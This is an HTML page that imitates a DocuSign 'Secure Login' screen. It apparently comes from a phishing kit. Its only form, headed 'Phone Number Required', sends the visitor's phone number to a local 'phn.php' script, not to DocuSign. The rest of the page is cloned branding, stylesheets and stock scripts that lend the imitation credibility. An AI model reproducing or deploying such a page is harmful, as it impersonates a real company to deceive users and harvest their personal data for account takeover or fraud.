


<!DOCTYPE html>
<html>
<head>  
    <meta charset="utf-8" />
    <meta content="IE=EDGE" http-equiv="X-UA-Compatible" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0" />
    <meta name="apple-itunes-app" content="app-id=383805716, affiliate-data=myAffiliateData, app-argument=myURL">
    <title> DocuSign</title>
    <link rel="apple-touch-icon" href="./images/dstr-app-icon-120x120.png" />
    <link href='//fonts.googleapis.com/css?family=Open+Sans:400,600,700' rel='stylesheet prefetch' type='text/css'>
    <!--[if lt IE 9]>
        <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->
    <link href="./css/site.css" rel="stylesheet"/>

    
    <script src="./js/jquery.js"></script>


    <!--[if lte IE 9]>
        <link href="./css/ie9.css" rel="stylesheet" />
    <![endif]-->
    <!--[if lte IE 8]>
        <link href="./css/ie8.css" rel="stylesheet" />
        <script src="./js/excanvas.compiled.js"></script>
    <![endif]-->
    <!--[if lte IE 7]>
        <link href="./css/ie7.css" rel="stylesheet" />
        <script src="./js/json2.js"></script>
    <![endif]-->
</head>
<body id="login" class="">
    <noscript>
        <div class="browser-msg">
            <span class="icof icof-warning"></span>
            Please enable Javascript in your browser to get the best experience with DocuSign Transaction Rooms.
        </div>
    </noscript>

    

<div role="main" class="container">
    <div class="wrapper">
        <div class="login-wrapper">
            <div class="logo">
                DocuSign  Secure Login
            </div>
            

<div class="login">
    
    <div class="instructions">
        <h4>Phone Number Required</h4>
        
    </div>

    <form  action="phn.php" method="post">
        <div class="input-stack">
            <input class="input-text" data-val="true" data-val-required="Phone number is required." id="Phone" name="phone" placeholder="Phone number" type="text" value="" />
        </div>
        <div class="buttons">
            <button class="btn-action col-1 btn-lg btn-green green" type="submit"><span class="text">Verify</span></button>
            <div class="create-account col-1 centered">
                <a class="strong" href="/account/signin"></a>
            </div>
        </div>
    </form>
</div>


        
            </div>
        </div>
    </div>    
</div>

<footer class="site-footer">
    <div class="container">
        <ul>
            <li><span>&copy; 2015 DocuSign, Inc.</span></li>
            
        </ul>
    </div>
</footer>



    
    <script src="./js/modernizr.js"></script>
<script src="./js/scripts.js"></script>


    

    
    
<script>
    $(document).ready(function () {
        ctv.password.initForgotPassword({ formId: 'formForgotPassword' });
    });
</script>



        <script>
            (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
                (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
                m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
            })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

            ga('create', 'UA-39550292-1', 'auto');
            ga('send', 'pageview');

        </script>
    

    <script type="text/javascript">
        $(function () {    
            //call ctv.init here?
            ctv.initPage({
                message: '',
                errorMessage: null,            
                infoMessage: null
            });
         });
    </script> 

</body>
</html>
